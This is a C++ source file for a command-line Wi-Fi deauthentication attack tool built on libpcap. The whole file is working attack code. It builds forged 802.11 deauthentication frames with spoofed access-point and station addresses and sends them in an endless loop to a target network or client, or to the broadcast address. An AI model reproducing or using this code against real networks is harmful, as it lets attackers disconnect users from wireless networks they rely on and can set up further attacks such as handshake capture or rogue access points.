#include <libnet.h>
#include <pcap.h>
#include <string>
#include "mac.h"

#pragma pack(push, 1)
struct ieee80211_radiotap_header {
	u_int8_t it_version;	/* set to 0 */
	u_int8_t it_pad;
	u_int16_t it_len;		/* entire length */
	u_int32_t it_present;	/* fields present */
};
struct ieee80211_beacon_mac_header {
	uint8_t type;
	uint8_t flag;
	uint16_t duration;	// ms
	Mac da;				// destination address
	Mac sa;				// source address
	Mac bssid;
	uint16_t seq;
};
struct fixed_parameter {
	uint16_t code;
};
struct tagged_parameter {
	uint8_t num;
	uint8_t len;
	uint8_t essid;
};
struct packet {
	ieee80211_radiotap_header radiotap;
	ieee80211_beacon_mac_header beacon;
	fixed_parameter fp;
};
#pragma pack(pop)

using radiotap_hdr = ieee80211_radiotap_header;
using beacon_hdr = ieee80211_beacon_mac_header;
using fixed_pm = fixed_parameter;
using taged_pm = tagged_parameter;

void usage() {
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
	exit(1);
}

void packet_init(packet &p, Mac sa, Mac da) {
	memset(&p.radiotap, 0, sizeof(radiotap_hdr));
	p.radiotap.it_len = 8;

	memset(&p.beacon, 0, sizeof(beacon_hdr));
	p.beacon.type = 0xc0;
	p.beacon.da = da;
	p.beacon.sa = sa;
	p.beacon.bssid = sa;

	p.fp.code = htons(0x700);
}

void packet_send(pcap_t *pcap, packet &p) {
	int res = pcap_sendpacket(pcap, (u_char *) &p, sizeof(packet));
	if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
		printf("pcap_sendpacket return %d(%s)\n", res, pcap_geterr(pcap));
		pcap_close(pcap);
		exit(1);
	}
}

int main(int argc, char *argv[]) {
	if(argc != 3 && argc != 4)
		usage();

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(1);
	}

	packet pk, pkk;
	packet_init(pk, Mac(argv[2]), Mac(argc == 3 ? "FF:FF:FF:FF:FF:FF" : argv[3]));
	if (argc == 4)
		packet_init(pkk, Mac(argv[3]), Mac(argv[2]));

	while(1) {
		packet_send(pcap, pk);
		packet_send(pcap, pk);
		if(argc == 4)
			packet_send(pcap, pkk),
			packet_send(pcap, pkk);
		sleep(1);
	}

	pcap_close(pcap);
	return 0;
}
